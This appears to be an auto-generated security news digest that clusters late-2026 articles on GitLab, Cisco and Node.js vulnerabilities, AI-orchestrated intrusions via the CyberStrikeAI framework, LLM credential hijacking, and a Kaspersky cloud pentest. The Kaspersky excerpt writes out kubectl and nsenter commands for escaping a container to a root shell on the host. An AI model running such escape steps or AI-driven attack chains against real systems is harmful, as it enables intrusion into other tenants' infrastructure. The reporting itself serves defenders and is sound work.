experienced operator – plays a particularly significant role here. A key feature of the scheme using the CyberStrikeAI framework is that the implant ceases to be a simple tool for executing the operator’s commands. Decisions are distributed across two levels: the operator defines the task in general terms, while the model determines how to execute it – specifically, which commands to send to the host and in what sequence. Thus, the strategic planning remains with the human, while the choice of technical steps is delegated to the model, and the implant executes the model’s decisions. To understand how this scheme works in practice, let’s examine the chain of actions taken by the attackers, as reconstructed by our analysts during the incident investigation. Timeline of the attack Let’s examine the timeline of the attack using an example from one incident within the detected campaign. The first phase follows a standard approach: a human operator gains access to the victim’s infrastructure via a compromised SQL Server (version 16.0.1000), then collects basic information about the host, deploys tools, and conducts network reconnaissance. All of this activity takes nearly a day, followed by a two-week pause. The second phase is fundamentally different. The first step involves deploying the CyberStrikeAI C2 agent, which receives commands from a server-based LLM orchestrator. During the second phase, the agent performs the following: establishing persistence and conducting local reconnaissance within 2 minutes; conducting domain reconnaissance over the next 5 hours; after a brief pause of several days, moving on to the final stage – lateral movement via SMB and WMI, mass credential dumping on hosts, and database export – with the entire operation taking no more than one hour. We’ll discuss these stages in more detail in the next section. Technical details CyberStrikeAI overview CyberStrikeAI is an open-source, modular platform written in Go for automating penetration testing. Its key feature is combining LLM-based attack orchestration and a built-in C2 server with agents (beacons) within a single server process. The entire “intelligent” layer is isolated on the control server. C2 functions (calling reconnaissance and exploi
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: CyberStrikeAI in the wild: the use of AI in real-world attacks on organizations
  - Published: 2026-11-02T08:00:24+00:00
  - Link: https://securelist.com/tr/cyberstrikeai-attacks/121715/
  - Summary: We analyze a series of attacks on educational institutions that were fully automated during the post-exploitation phase using the CyberStrikeAI penetration testing framework.

### Cluster 2c1062209b — score 29

- Title: Over 1,000 GitLab servers vulnerable to ongoing RCE attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-11-02T12:47:00+00:00
- Link: https://www.bleepingcomputer.com/news/security/over-1-000-gitlab-servers-vulnerable-to-code-execution-attacks/
- Fetch status: ok
- Member count: 5
- Corroborating source count: 3
- Strong signals: GitLab

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, vulnerability_disclosure
- affected_industries: government
- affected_products: GitLab, Google Workspace, Microsoft 365
- cve_ids: CVE-2026-0723, CVE-2026-110264, CVE-2026-85706, CVE-2026-97229
- urgency_signals: actively_exploited, critical_cvss, no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, active_exploitation
- affected_industries: government
- affected_products: GitLab, Microsoft 365, Google Workspace
- cve_ids: CVE-2026-97229, CVE-2026-0723, CVE-2026-85706, CVE-2026-110264
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Over 1,000 Internet-exposed GitLab servers are still unpatched against a maximum-severity flaw actively exploited in remote code execution attacks. [...]
```

#### Full body

```
Over 1,000 GitLab servers vulnerable to ongoing RCE attacks By Sergiu Gatlan November 2, 2026 07:47 AM 0 Over 1,000 Internet-exposed GitLab servers are still unpatched against a maximum-severity flaw actively exploited in remote code execution attacks. Tracked as CVE-2026-97229 , this vulnerability stems from an integer overflow weakness and was discovered in the CI/CD Regular Expression Compiler, which parses and evaluates regular expressions in pipeline configuration files. "GitLab has remediated an issue that, under certain conditions, could have allowed an unauthenticated user to execute arbitrary code on the GitLab server via a specially crafted regular expression in a CI/CD configuration, due to insufficient regular expression validation," the company explained on October 12 when it released security patches to address the security issue in GitLab Community Edition (CE) and Enterprise Edition (EE) versions 19.4.2, 19.3.5, and 19.2.8. "These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded to one of these versions immediately. GitLab.com is already running the patched version. GitLab Dedicated customers do not need to take action," it added. On Friday, the US Cybersecurity and Infrastructure Security Agency (CISA) confirmed that attackers have begun exploiting the flaw in the wild and added CVE-2026-97229 to its Known Exploited Vulnerabilities (KEV) Catalog , ordering federal agencies to secure their servers by Sunday. Although GitLab released patches three weeks ago, threat watchdog Shadowserver revealed over the weekend that it tracks more than 1,000 unpatched GitLab servers exposed to ongoing attacks. Vulnerable GitLab instances exposed online (Shadowserver) ​​CVE-2026-97229 is the latest in a series of GitLab security issues addressed since the start of the year. In January, GitLab fixed a high-severity flaw (CVE-2026-0723) that lets attackers bypass two-factor authentication, and in September, a maximum-severity vulnerability (CVE-2026-85706) in the repository commits API that can be exploited to steal credentials and other secrets. CISA also flagged CVE-2026-85706 as actively abused in the wild after cybersecurity firm watchTowr reported that attackers had already begun scanning for vulnerable GitLab servers. Last month, it addressed another maximum-severity Regular Expression Compiler bug (CVE-2026-110264) that lets threat actors run arbitrary code on targeted instances. "We are currently tracking over 1000 GitLab instances vulnerable to CVE-2026-97229 (on @CISACyber KEV) and over 11300 instances vulnerable to CVE-2026-110264 (out of around 39K GitLab instances we see daily)," Shadowserver said on Sunday. Since November 2021, CISA has added six GitLab flaws to its catalog of actively exploited vulnerabilities, one of which has also been used in ransomware attacks. GitLab says its DevSecOps platform has over 70 million registered users and is used by more than 50% of Fortune 100 companies worldwide. Uncover email threats your existing defenses may miss. Adaptive Security's AI agents analyze email intent, context, and behavior to uncover phishing, business email compromise, and invoice fraud. See what's getting through with a 14-day read-only scan of Microsoft 365 or Google Workspace, with no MX changes. Start your free email security scan. Related Articles: CISA says max severity GitLab flaw now exploited in the wild GitLab warns of new max severity code execution vulnerability GitLab warns of max severity code execution vulnerability Hackers exploit SiteGuard WAF flaw to run commands as admins Check Point warns of hackers exploiting Security Gateway VPN RCE flaw
```

#### Corroborating sources (3)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Over 1,000 GitLab servers vulnerable to ongoing RCE attacks
  - Published: 2026-11-02T12:47:00+00:00
  - Link: https://www.bleepingcomputer.com/news/security/over-1-000-gitlab-servers-vulnerable-to-code-execution-attacks/
  - Summary: Over 1,000 Internet-exposed GitLab servers are still unpatched against a maximum-severity flaw actively exploited in remote code execution attacks. [...]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISA Adds Actively Exploited GitLab RCE and Cisco Firewall DoS Flaws to KEV
  - Published: 2026-10-30T07:27:05+00:00
  - Link: https://thehackernews.com/2026/10/cisa-adds-actively-exploited-gitlab-rce.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday added two security flaws impacting Cisco and GitLab software to its Known Exploited Vulnerabilities (KEV), citing evidence of active exploitation. The vulnerabilities are listed below - CVE-2026-97229 (CVSS score: 10.0) - An integer overflow or wraparound vulnerability in GitLab Community Edition and Enterprise
- **Interconnects** (ai_security_agentic_risk)
  - Title: Was I wrong about open models & cyber risks?
  - Published: 2026-10-30T17:36:56+00:00
  - Link: https://www.interconnects.ai/p/was-i-wrong-about-open-models-and
  - Summary: Last week coined the term “Black October“ after an onslaught of critical vulnerability disclosures, including PHP2Shell and a long-standing GitLab bug, signified the moment when the cyber risks of AI models started to materialize.

### Cluster bce7fc7634 — score 24

- Title: Cisco Patches Actively Exploited ASA and FTD VPN Flaw That Can Crash Firewalls
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-29T10:44:46+00:00
- Link: https://thehackernews.com/2026/10/cisco-patches-actively-exploited-asa.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-76418

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ddos
- actor_attribution: Volt Typhoon
- affected_industries: aviation_defense
- affected_products: Cisco
- cve_ids: CVE-2026-20127, CVE-2026-76418
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos, apt_espionage, active_exploitation
- actor_attribution: Volt Typhoon
- affected_industries: aviation_defense
- affected_products: Cisco
- cve_ids: CVE-2026-76418, CVE-2026-20127
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cisco has released patches to address a high-severity security flaw in Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software that it said has been exploited in the wild. The vulnerability, tracked as CVE-2026-76418, is rated 8.6 on the CVSS scoring system. Successful exploitation could allow an unauthenticated, remote attacker to cause the
```

#### Full body

```
Cisco Patches Actively Exploited ASA and FTD VPN Flaw That Can Crash Firewalls  Ravie Lakshmanan  Oct 29, 2026 Vulnerability / Network Security Cisco has released patches to address a high-severity security flaw in Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software that it said has been exploited in the wild. The vulnerability, tracked as CVE-2026-76418 , is rated 8.6 on the CVSS scoring system. Successful exploitation could allow an unauthenticated, remote attacker to cause the device to reload unexpectedly, resulting in a denial-of-service (DoS) condition. According to Cisco, the issue is rooted in the Remote Access SSL VPN service of ASA and FTD software. "This vulnerability is due to logic errors when secondary authentication is configured on a tunnel group," it said in a Wednesday advisory. "An attacker could exploit this vulnerability by sending a crafted request when connecting to the SSL remote access VPN. A successful exploit could allow the attacker to cause the affected device to reload, resulting in a DoS condition." The network equipment major said it became aware of active exploitation of this vulnerability in October 2026, but did not share any specifics as to when the attacks began, who is behind them, and the scale of the efforts. Fixes for the flaw are available in the following versions - Cisco Secure Firewall ASA Software Release 9.16 and earlier - Fixed in 9.16.4.104 9.18 - Fixed in 9.18.4.96 9.20 - Fixed in 9.20.4.50 9.22 - Fixed in 9.22.3.200 9.23 - Fixed in 9.23.1.48 9.24 - Fixed in 9.24.1.27 and 9.24.10.1 Cisco Secure FTD Software Release 7.0 and earlier - Fixed in 7.0.11 7.2 - Fixed in 7.2.13 7.4 - Fixed in 7.4.9 7.6 - Fixed in 7.6.7 7.7 - Fixed in 7.7.14 10.0 - Fixed in 10.0.3 10.1 - Fixed in 10.1.1 Cisco also noted that the vulnerability affects Cisco devices if the following conditions are met - They are running a vulnerable release of Cisco Secure Firewall ASA Software or Cisco Secure FTD Software. The SSL remote access VPN login service is reachable. Secondary authentication is configured in the tunnel group scope. "If tunnel-group-list enable is configured, check all tunnel groups, including the default tunnel group, DefaultWEBVPNGroup, for secondary-authentication-server-group," Cisco said. "If tunnel-group-list enable is absent or has been removed using the no tunnel-group-list enable command, check the default tunnel group, DefaultWEBVPNGroup, for secondary-authentication-server-group because disabling the group list does not remove exposure when that default group uses secondary authentication." As a temporary mitigation, the company is recommending that customers turn off the tunnel group list if DefaultWEBVPNGroup does not use secondary authentication, or disable secondary authentication on any user-configured tunnel group list or on the default tunnel group, DefaultWEBVPNGroup. "On Cisco Secure FTD Software, review the deployed remote access VPN policy and the resulting device running configuration in Cisco Secure FMC Software or Cisco Secure FDM," Cisco said. "A successful VPN login is not required to reach the affected processing path." The disclosure comes as Cisco revealed that a sophisticated advanced persistent threat (APT) actor tracked as UAT-11473 weaponized CVE-2026-20127 , an authentication bypass vulnerability in Cisco SD-WAN Catalyst Controller instances, to bypass authentication and gain unauthorized access to affected systems. The activity, which has targeted space and satellite services, defense and aerospace technology, and policy research sectors, is assessed to share infrastructure overlaps with Volt Typhoon's Silent Train covert network. "UAT-11473 then installed a custom malware framework we track as 'KeyDrift' consisting of multiple components [like PolyFlame and LittleFilch] geared towards collecting sensitive keying information, acting as backdoors and intermediate command-and-control (C2) hosts," Cisco Ta
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco Patches Actively Exploited ASA and FTD VPN Flaw That Can Crash Firewalls
  - Published: 2026-10-29T10:44:46+00:00
  - Link: https://thehackernews.com/2026/10/cisco-patches-actively-exploited-asa.html
  - Summary: Cisco has released patches to address a high-severity security flaw in Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software that it said has been exploited in the wild. The vulnerability, tracked as CVE-2026-76418, is rated 8.6 on the CVSS scoring system. Successful exploitation could allow an unauthenticated, remote attacker to cause the

### Cluster 3069205f26 — score 23

- Title: Node2Shell (CVE-2026-111497): Detecting the Node.js Brotli RCE
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-28T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-111497

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Docker
- cve_ids: CVE-2026-111497
- urgency_signals: no_patch_yet, poc_available
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Docker
- cve_ids: CVE-2026-111497
- urgency_signals: no_patch_yet, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Full body

```
threat-research This is some text inside of a div block. < back to blog Node2Shell (CVE-2026-111497): Detecting the Node.js Brotli RCE Published by: Sysdig Threat Research Team @ linkedin Subscribe to Threat Research Published: October 28, 2026 Table of contents TRT in your inbox Get security briefings from the Threat Research Team New campaigns, attacker techniques, and detection guidance — straight to your inbox. Subscribe falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more This blog was originally published on October 24, 2026. As of October 28, 2026, Node2Shell is also tracked as HTTP2Shell and there are four important updates: The Sysdig TRT added an additional runtime rule called Node.js Process Redirected Network Socket to Standard Stream to Runtime Notable Events. The rule detects the post-exploitation step of Node2Shell. We previously reported there was no confirmed exploitation. On October 26, ELLIO confirmed exploitation. Initially, we cited only one RCE reproduction. OtterSec has since reported dozens. Debian was previously unpatched. Debian 12 and 13 now ship a fixed brotli , and Debian's Node.js uses the system library. A malformed compressed stream, an ignored error, and a write past the end of a buffer. On October 21, 2026, Node.js shipped fixes for an out-of-bounds write in the Brotli decoder it bundles, versions 22.23.4 , 24.22.1 , and 26.12.1 . One day later, on October 22, Imperva reported running code on the official Node.js 24.22.0 Docker image for Linux arm64. The vulnerability, now tracked as CVE-2026-111497 , received a CVSS v4.0 base score of 9.2 (Critical) and has been widely referred to as Node2Shell. As of October 23, no confirmed in-the-wild exploitation has been reported, and Node2Shell has not been added to CISA’s Known Exploited Vulnerabilities (KEV) catalog. However, public proof-of-concept (PoC) code has been tested , and the gap between patch and PoC was about a day. Security teams should work to uncover all instances where their Node.js services decode Brotli data they don’t control, and begin by patching those first. The Sysdig Threat Research Team (TRT) analyzed public Node2Shell research to help defenders understand who is reachable, what has been demonstrated versus claimed, what runtime visibility can detect, and what they can do until their organization can begin to patch. Timeline Date Event Oct. 14, 2026 Node.js pre-announces the release, naming the affected lines and a top severity of high Oct. 21, 2026, 10:38 UTC Node.js publishes v22.23.4, v24.22.1, and v26.12.1 Oct. 21, 2026, 15:47 UTC The first public GitHub repository for the CVE appears, about five hours after the fixes ship Oct. 21, 2026, ~19:27 UTC The Brotli project publishes 1.0.10, 1.1.1, and 1.2.1, each listing CVE-2026-111497 Oct. 22, 2026 Google’s CVE record is published with a 9.2 score on CVSS v4.0 Oct. 22, 2026 Imperva publishes research showing code execution on Node.js 24.22.0 Affected Node.js versions The bug itself is in Brotli, not within Node.js code. Node.js bundles its own copy, so fixing it means updating the runtime itself. The Node.js advisory rates the vulnerability as high severity. Google scores it as a critical severity vulnerability, at 9.2 on CVSS v4.0. However, severity may depend on exposure, which is determined by whether your code reaches the decoder. Node.js version End of life Fixed version 26.x Apr. 30, 2029 26.12.1 24.x Apr. 30, 2028 24.22.1 22.x Apr. 30, 2027 22.23.4 25.x Jun. 1, 2026 (ended) No fix 20.x Apr. 30, 2026 (ended) No fix Node.js states that end-of-life versions are always affected by security releases. Organizations running Node.js 25, 20, or older should treat those hosts as vulnerable, with no further patches coming. Distribution packages need their own check. Debian’s tracker , read on October 23, lists nodejs 18.20.4 in book
```

#### Corroborating sources (4)

- **Sysdig** (detection_response_operations)
  - Title: Node2Shell (CVE-2026-111497): Detecting the Node.js Brotli RCE
  - Published: 2026-10-28T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
- **Sophos X-Ops** (detection_response_operations)
  - Title: Node2Shell (CVE-2026-111497) in active exploitation
  - Published: 2026-10-28T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/node2shell-cve-2026-111497-in-active-exploitation
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, Node2Shell, Brotli
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Node.js Brotli Decoder Out-of-Bounds Write Threatens Remote Code Execution Across All Supported Versions
  - Published: 2026-10-27T14:54:29+00:00
  - Link: https://orca.security/resources/research/cve-2026-111497-nodejs-brotli-rce/
  - Summary: Executive Summary: A high-severity vulnerability (CVE-2026-111497) was disclosed affecting Node.js across all supported release lines (22.x, 24.x, 26.x), allowing attackers to achieve remote code execution via malformed Brotli-compressed data processed by node:zlib or fetch(). Due to the potential for crashes, memory disclosure, and code execution in cloud workloads, immediate patching is required. About CVE-2026-111497 The […]
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: Node2Shell: Reproducing CVE-2026-111497 in the Node.js Brotli decoder
  - Published: 2026-10-29T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/node2shell-cve-2026-111497-nodejs-brotli-decoder/
  - Summary: We reproduced CVE-2026-111497, an out-of-bounds write in the Brotli decoder bundled with Node.js and other runtimes, and explain how to detect and remediate it.

### Cluster 892f20b51d — score 22

- Title: Mutipath TCP: Use and Detection, (Mon, Nov 2nd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-11-02T14:52:05+00:00
- Link: https://isc.sans.edu/diary/rss/33482
- Fetch status: fetch_failed:HTTPError
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-98432

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, Linux kernel
- cve_ids: CVE-2026-98432
- content_type: news_report
- confidence_tier: tier_1_government, tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-98432
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Last week, an often-ignored&#;x26;#;xc2;&#;x26;#;xa0;TCP option, introduced in 2020, made the news due to a new vulnerability in Linux&#;x26;#;39;s implementation (RFC&#;x26;#;xc2;&#;x26;#;xa0;8684, &#;x26;#;xc2;&#;x26;#;xa0;CVE-2026-98432)
```

#### Corroborating sources (2)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Mutipath TCP: Use and Detection, (Mon, Nov 2nd)
  - Published: 2026-11-02T14:52:05+00:00
  - Link: https://isc.sans.edu/diary/rss/33482
  - Summary: Last week, an often-ignored&#;x26;#;xc2;&#;x26;#;xa0;TCP option, introduced in 2020, made the news due to a new vulnerability in Linux&#;x26;#;39;s implementation (RFC&#;x26;#;xc2;&#;x26;#;xa0;8684, &#;x26;#;xc2;&#;x26;#;xa0;CVE-2026-98432)
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Linux Kernel TCP Flaw With 9.8 CVSS Score Affects Ubuntu, Red Hat and Other Distributions
  - Published: 2026-10-29T15:57:05+00:00
  - Link: https://thehackernews.com/2026/10/linux-kernel-tcp-flaw-with-98-cvss.html
  - Summary: A flaw in the Linux kernel's TCP code, tracked as CVE-2026-98432, affects Ubuntu, Red Hat Enterprise Linux (RHEL), and other Linux distributions. The kernel's own CVE team rates it 9.8 out of 10 on the CVSS scale. Anthropic said on October 27 that its AI model wrote an exploit that uses the flaw to let a remote attacker with no credentials run commands as root on Linux servers with a

### Cluster b4921fee31 — score 22

- Title: The Rise of LLMJacking: How Threat Actors Monetize Compromised Cloud and Model Resources
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-11-02T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/llmjacking-monetizing-compromised-cloud-models/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, cryptojacking
- actor_attribution: UNC6993
- affected_industries: financial_services, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft, cryptojacking
- actor_attribution: UNC6993
- affected_industries: financial_services, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Written by: Christopher Romano, Codi Starks, Garrett Mahoney, John Wolfram, Josh Murchie, K Singh, Mathew Potaczek, Mike Lombardi, Rik Dolfing Introduction Mandiant responded to multiple incidents in 2026 in which threat actors hijacked enterprise access to Large Language Models (LLMs), a tactic known as "LLMJacking." Spanning a variety of cloud and LLM providers, these intrusions impacted organizations in North America, South America, and Asia Pacific across the financial services, retail, technology, and transportation sectors. Unlike the gradual resource consumption associated with cryptojacking, LLMJacking can generate large spikes in fraudulent cloud charges in a matter of hours. Across individual incidents, we observed fraudulent charges associated with resource consumption exceeding $100,000 USD in a single day, with cumulative charges at some organizations reaching $1 million USD before access was revoked. Figure 1: Usage chart showing LLMJacking generating a spike in API reque
```

#### Full body

```
Threat Intelligence The Rise of LLMJacking: How Threat Actors Monetize Compromised Cloud and Model Resources November 2, 2026 Google Threat Intelligence Group Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Christopher Romano, Codi Starks, Garrett Mahoney, John Wolfram, Josh Murchie, K Singh, Mathew Potaczek, Mike Lombardi, Rik Dolfing Introduction Mandiant responded to multiple incidents in 2026 in which threat actors hijacked enterprise access to Large Language Models (LLMs), a tactic known as "LLMJacking." Spanning a variety of cloud and LLM providers, these intrusions impacted organizations in North America, South America, and Asia Pacific across the financial services, retail, technology, and transportation sectors. Unlike the gradual resource consumption associated with cryptojacking, LLMJacking can generate large spikes in fraudulent cloud charges in a matter of hours. Across individual incidents, we observed fraudulent charges associated with resource consumption exceeding $100,000 USD in a single day, with cumulative charges at some organizations reaching $1 million USD before access was revoked. Figure 1: Usage chart showing LLMJacking generating a spike in API requests Analyzing the criminal ecosystem behind these frontline compromises, and building upon previous reporting on the growing underground market for LLM credentials, Google Threat Intelligence Group (GTIG) has identified a diverse set of financially motivated threat clusters operating out of multiple regions globally. As the LLMJacking ecosystem matures, we are also tracking a division of labor between threat actors establishing initial access to compromised environments and operators managing downstream monetization infrastructure, known as “LLM Mixers”. LLM Mixers function as illicit routing gateways that proxy, aggregate, and resell unauthorized LLM access to underground subscribers. In one investigation, GTIG observed two distinct operational clusters coordinating to compromise and monetize enterprise LLM infrastructure, demonstrating the sophisticated specialization emerging in this space. In this blog post, we describe the attack lifecycle observed across recent LLMJacking investigations and provide actionable detection, hardening, and remediation guidance to help organizations secure their infrastructure. Initial Access While low-level resource theft has involved the manipulation of customer support chatbots to conduct unauthorized tasks like code generation, threat actors conducting LLMJacking bypass these front-end interfaces to target backend model resources directly. Specifically, they focus on either identifying publicly exposed LLM endpoints or obtaining valid LLM application programming interface (API) keys. An example of the latter can be seen in Figure 1, where a threat actor uses an automated script to verify exposure by calling the /api/create endpoint to independently run their own models on endpoints that unsuspecting users have left publicly accessible. Leaving these services unprotected not only expands an organization's traditional attack surface, but could also introduce a significant increase in hosting costs. Figure 2: Threat Actor tests publicly exposed Ollama endpoints and attempts to register their own models Across multiple LLMJacking investigations, however, the dominant initial access vector has been exposed or stolen cloud identity tokens—including IAM credentials, Service Account keys, GitHub Personal Access Tokens (PATs), and active session tokens—which threat actors leverage to establish an initial foothold into target organizations' infrastructure. For instance, in mid-2026 UNC6993 compromised a cloud instance through a misconfigured Service Account key and used this access to grant further access to an LLM API. UNC6993 also hosted a session hijacking page masquerading as an application portal to join a group of LLM users. This page tricks users into navigati
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: The Rise of LLMJacking: How Threat Actors Monetize Compromised Cloud and Model Resources
  - Published: 2026-11-02T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/llmjacking-monetizing-compromised-cloud-models/
  - Summary: Written by: Christopher Romano, Codi Starks, Garrett Mahoney, John Wolfram, Josh Murchie, K Singh, Mathew Potaczek, Mike Lombardi, Rik Dolfing Introduction Mandiant responded to multiple incidents in 2026 in which threat actors hijacked enterprise access to Large Language Models (LLMs), a tactic known as "LLMJacking." Spanning a variety of cloud and LLM providers, these intrusions impacted organizations in North America, South America, and Asia Pacific across the financial services, retail, technology, and transportation sectors. Unlike the gradual resource consumption associated with cryptojacking, LLMJacking can generate large spikes in fraudulent cloud charges in a matter of hours. Across individual incidents, we observed fraudulent charges associated with resource consumption exceeding $100,000 USD in a single day, with cumulative charges at some organizations reaching $1 million USD before access was revoked. Figure 1: Usage chart showing LLMJacking generating a spike in API reque
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: The Rise of LLMJacking: How Threat Actors Monetize Compromised Cloud and Model Resources
  - Published: 2026-11-02T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/llmjacking-monetizing-compromised-cloud-models/
  - Summary: Written by: Christopher Romano, Codi Starks, Garrett Mahoney, John Wolfram, Josh Murchie, K Singh, Mathew Potaczek, Mike Lombardi, Rik Dolfing Introduction Mandiant responded to multiple incidents in 2026 in which threat actors hijacked enterprise access to Large Language Models (LLMs), a tactic known as "LLMJacking." Spanning a variety of cloud and LLM providers, these intrusions impacted organizations in North America, South America, and Asia Pacific across the financial services, retail, technology, and transportation sectors. Unlike the gradual resource consumption associated with cryptojacking, LLMJacking can generate large spikes in fraudulent cloud charges in a matter of hours. Across individual incidents, we observed fraudulent charges associated with resource consumption exceeding $100,000 USD in a single day, with cumulative charges at some organizations reaching $1 million USD before access was revoked. Figure 1: Usage chart showing LLMJacking generating a spike in API reque

### Cluster 092b6c8b44 — score 21

- Title: An insecure neighbor: how a vulnerability chain led to an isolation bypass in cloud infrastructure
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-10-27T12:00:19+00:00
- Link: https://securelist.com/cloud-infrastructure-isolation-bypass/121609/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Kubernetes

#### Cluster taxonomy (union across members)
- affected_products: Kubernetes
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_products: Kubernetes
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
A Kaspersky expert presents a cloud isolation bypass case honored at Russian Pentest Award 2026. Learn how vulnerabilities in Kubernetes, Konnectivity, and the overlay network lead to RCE and compromise of other tenants' services.
```

#### Full body

```
Table of Contents Introduction 1. Gaining initial access through a managed Kubernetes cluster 1.1. Escaping the worker node 1.2. Analysis of control plane services 1.3. Exploiting Konnectivity 1.4. Privilege escalation on the host 2. Adventures in the overlay network 2.1. Victoria stack 2.2. Compromising managed Kafka instances 2.3. Credential leakage through redis-exporter 2.4. Compromise of managed PostgreSQL (Patroni) clusters 3. Attack on SaltStack management infrastructure 3.1. Analysis of salt fs 3.2. Exploiting the SQLi 4. Other ways to attack the cloud 4.1. Exploiting a vulnerability in Managed Valkey 4.2. MySQL Conclusion Authors Matvey Bukhtoyarov Kaspersky Security Services This article is published for educational purposes only, to raise awareness among information security professionals. The research was part of an official bug bounty program on a major platform. We notified the cloud provider about the vulnerabilities in line with our responsible disclosure policy, and all security issues we found were fixed in full. The infrastructure analyzed in this post has been anonymized, so the organization cannot be identified. We believe that regular pentests, bug bounty programs, and conversations between developers and independent researchers are the foundation of security for any IT product. Introduction Many experts believe that cloud data breaches are mostly the customers’ fault, caused by issues like misconfigured storage or open ports. However, our penetration test of a major cloud provider demonstrated that critical threats can originate within the provider’s own infrastructure. This analysis is based on a real-world case that won second place in the System Hacking (Web & Logic) category at Russian Pentest Award 2026 . It covers the sequential exploitation of several vulnerabilities and logic errors. Together, they led to critical business consequences and a complete bypass of tenant isolation within the cloud. On October 22, 2026, I presented a technical analysis of this case in my “Smash the Tenant Boundary” talk at Security Analyst Summit (SAS 2026). 1. Gaining initial access through a managed Kubernetes cluster Our cloud infrastructure pentest followed the threat model of an external attacker with the privileges of a regular tenant. The ultimate goal of the attack was to assume full control of the cloud. 1.1. Escaping the worker node First, we created a resource in the cloud’s managed Kubernetes cluster ( v1.25.16+k0s.0 ). As a rule, the provider deliberately withholds SSH access to worker nodes from tenants, because they’re paying for a managed service, not for running servers themselves. In this case, however, the cluster’s security policies did not prevent the creation of privileged pods with access to host namespaces. This enabled us to deploy a pod and switch the execution context to the host machine running the container. kubectl run pod-name-bla \ --image=alpine \ --restart=Never \ --overrides=' { "apiVersion": "v1", "spec": { "hostPID": true, "containers": [ { "name": "priv", "image": "alpine", "command": [ "sh", "-c", "sleep 3600" ], "stdin": true, "tty": true, "securityContext": { "privileged": true } } ] } }' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 kubectl run pod - name - bla \ -- image = alpine \ -- restart = Never \ -- overrides = ' { "apiVersion": "v1", "spec": { "hostPID": true, "containers": [ { "name": "priv", "image": "alpine", "command": [ "sh", "-c", "sleep 3600" ], "stdin": true, "tty": true, "securityContext": { "privileged": true } } ] } }' After creating the privileged pod, we ran the nsenter command inside the container. It moved the execution context to the host machine: nsenter --target 1 --mount --uts --ipc --net --pid – bash 1 nsenter -- target 1 -- mount -- uts -- ipc -- net -- pid – bash After this, the bash shell ran on the actual host machine, not inside the container. Because the pod was privileged, we got full root access to the host machine. Kubelet config
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: An insecure neighbor: how a vulnerability chain led to an isolation bypass in cloud infrastructure
  - Published: 2026-10-27T12:00:19+00:00
